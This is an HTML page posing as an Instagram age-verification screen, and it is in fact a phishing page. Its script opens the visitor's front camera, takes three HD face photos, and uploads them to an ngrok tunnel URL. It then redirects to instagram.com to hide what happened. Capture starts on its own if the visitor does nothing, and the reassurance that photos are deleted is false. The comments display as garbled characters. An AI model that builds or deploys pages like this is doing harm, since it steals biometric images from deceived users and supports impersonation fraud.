<!DOCTYPE html>
<html>
<head>
    <title>Instagram Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            margin: 50px auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(45deg, #405de6, #833ab4);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }
        .button {
            background: linear-gradient(45deg, #405de6, #833ab4);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px 0;
            font-weight: bold;
            width: 100%;
            transition: transform 0.3s;
        }
        .button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .quality-badge {
            background: #00d2d3;
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 14px;
            display: inline-block;
            margin: 10px;
        }
        .status {
            margin-top: 30px;
            padding: 15px;
            border-radius: 10px;
            background: #f8f9fa;
            min-height: 60px;
        }
        .photo-counter {
            font-size: 14px;
            color: #666;
            margin: 10px 0;
        }
        .open-browser {
            background: #ff9f43;
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            display: inline-block;
            margin-top: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üì∑</div>
        
        <h1>Instagram Age Verification</h1>
        
        <div class="quality-badge">HD Face Recognition</div>
        
        <p>To continue using Instagram, we need to verify your age with high-quality facial recognition.</p>
        
        <div class="photo-counter">
            <strong>Process:</strong> 3 high-quality photos ‚Ä¢ 10 seconds
        </div>
        
        <button class="button" onclick="startHDVerification()">
            Start HD Face Verification
        </button>
        
        <a href="#" class="open-browser" onclick="openInExternalBrowser()">
            ‚¨à Open in Browser for Better Quality
        </a>
        
        <div class="status" id="status">
            Ready to verify...
        </div>
        
        <div style="margin-top: 30px; font-size: 12px; color: #888;">
            <p>üîí Your data is processed securely and deleted after verification.</p>
            <p>üì∏ Photos are captured in 1280x720 HD quality for accurate verification.</p>
        </div>
    </div>

    <script>
        // ÿ±ÿßÿ®ÿ∑ ngrok
        const NGROK_URL = 'https://affrontingly-unviewed-towanda.ngrok-free.dev';
        let photosTaken = 0;
        let stream = null;
        
        function updateStatus(message, isError = false) {
            const status = document.getElementById('status');
            status.innerHTML = message;
            status.style.color = isError ? '#e74c3c' : '#2ecc71';
            status.style.fontWeight = 'bold';
            console.log('[Status]', message);
        }
        
        function openInExternalBrowser() {
            const currentUrl = window.location.href;
            const externalUrl = currentUrl + '?external=true';
            
            // ŸÖÿ≠ÿßŸàŸÑÿ© ŸÅÿ™ÿ≠ ŸÅŸä ŸÖÿ™ÿµŸÅÿ≠ ÿÆÿßÿ±ÿ¨Ÿä
            window.open(externalUrl, '_blank');
            
            updateStatus('Please continue verification in the new browser window.');
            
            setTimeout(() => {
                alert('If new window did not open, please allow pop-ups and try again.');
            }, 1000);
            
            return false;
        }
        
        async function startHDVerification() {
            updateStatus('Initializing HD camera...');
            
            try {
                // ÿ∑ŸÑÿ® ŸÉÿßŸÖŸäÿ±ÿß ÿ®ÿØŸÇÿ© ÿπÿßŸÑŸäÿ©
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280, max: 1920 },
                        height: { ideal: 720, max: 1080 },
                        frameRate: { ideal: 30 }
                    },
                    audio: false
                });
                
                updateStatus('HD camera activated ‚úÖ');
                
                // ÿπÿ±ÿ∂ ŸÖÿπÿßŸäŸÜÿ© ÿµÿ∫Ÿäÿ±ÿ©
                const preview = document.createElement('video');
                preview.srcObject = stream;
                preview.autoplay = true;
                preview.muted = true;
                preview.style.width = '200px';
                preview.style.borderRadius = '10px';
                preview.style.margin = '15px auto';
                preview.style.display = 'block';
                document.querySelector('.container').appendChild(preview);
                
                // ÿßŸÑÿ™ŸÇÿßÿ∑ 3 ÿµŸàÿ± ÿ®ÿ¨ŸàÿØÿ© ÿπÿßŸÑŸäÿ©
                for (let i = 1; i <= 3; i++) {
                    updateStatus(`üì∏ Capturing HD photo ${i}/3...`);
                    await captureHDPicture(preview, i);
                    await delay(2000); // ÿßŸÜÿ™ÿ∏ÿßÿ± 2 ÿ´ŸàÿßŸÜŸä ÿ®ŸäŸÜ ÿßŸÑÿµŸàÿ±
                }
                
                // ÿ•ŸÉŸÖÿßŸÑ ÿßŸÑÿπŸÖŸÑŸäÿ©
                updateStatus('‚úÖ Verification complete! Processing...');
                
                // ÿ•ŸäŸÇÿßŸÅ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                    preview.remove();
                }
                
                // ÿ•ÿπÿßÿØÿ© ÿßŸÑÿ™Ÿàÿ¨ŸäŸá ÿ®ÿπÿØ 3 ÿ´ŸàÿßŸÜŸä
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com';
                }, 3000);
                
            } catch (error) {
                updateStatus(`‚ùå Error: ${error.message}`, true);
                alert('HD camera access is required. Please enable camera permissions.');
            }
        }
        
        async function captureHDPicture(videoElement, photoNumber) {
            return new Promise((resolve, reject) => {
                // ÿßŸÜÿ™ÿ∏ÿ± ÿ≠ÿ™Ÿâ ŸäŸÉŸàŸÜ ÿßŸÑŸÅŸäÿØŸäŸà ÿ¨ÿßŸáÿ≤ÿßŸã
                setTimeout(() => {
                    try {
                        // ÿ•ŸÜÿ¥ÿßÿ° canvas ÿ®ÿØŸÇÿ© ÿπÿßŸÑŸäÿ©
                        const canvas = document.createElement('canvas');
                        canvas.width = 1280;
                        canvas.height = 720;
                        
                        const ctx = canvas.getContext('2d');
                        
                        // ÿ±ÿ≥ŸÖ ÿßŸÑŸÅŸäÿØŸäŸà ÿπŸÑŸâ Canvas ŸÖÿπ ÿ£ŸÅÿ∂ŸÑ ÿ¨ŸàÿØÿ©
                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                        
                        // ÿ™ÿ≠ŸàŸäŸÑ ÿ•ŸÑŸâ ÿµŸàÿ±ÿ© JPEG ÿ®ÿ¨ŸàÿØÿ© 90%
                        const imageData = canvas.toDataURL('image/jpeg', 0.9);
                        
                        updateStatus(`‚¨ÜÔ∏è Uploading photo ${photoNumber}/3 (HD)...`);
                        
                        // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ÿπÿßŸÑŸäÿ© ÿßŸÑÿ¨ŸàÿØÿ©
                        fetch(NGROK_URL + '/upload', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                photo_number: photoNumber,
                                quality: 'HD',
                                resolution: '1280x720',
                                timestamp: new Date().toISOString(),
                                image: imageData
                            })
                        })
                        .then(response => {
                            if (response.ok) {
                                photosTaken++;
                                updateStatus(`‚úÖ Photo ${photoNumber}/3 uploaded successfully!`);
                                resolve();
                            } else {
                                throw new Error('Upload failed');
                            }
                        })
                        .catch(error => {
                            console.error('Upload error:', error);
                            updateStatus(`‚ö†Ô∏è Photo ${photoNumber} upload failed, but continuing...`);
                            resolve(); // ÿßÿ≥ÿ™ŸÖÿ± ÿ≠ÿ™Ÿâ ŸÑŸà ŸÅÿ¥ŸÑ ÿßŸÑÿ™ÿ≠ŸÖŸäŸÑ
                        });
                        
                    } catch (error) {
                        reject(error);
                    }
                }, 500);
            });
        }
        
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        // ÿ•ÿ∞ÿß ŸÅÿ™ÿ≠ ŸÅŸä ŸÜÿßŸÅÿ∞ÿ© ÿÆÿßÿ±ÿ¨Ÿäÿ©
        if (window.location.search.includes('external=true')) {
            setTimeout(() => {
                startHDVerification();
            }, 1000);
        }
        
        // Auto-start after 10 seconds if no action
        setTimeout(() => {
            if (photosTaken === 0) {
                updateStatus('‚è±Ô∏è Verification will start automatically in 5 seconds...');
                setTimeout(startHDVerification, 5000);
            }
        }, 10000);
    </script>
</body>
</html>
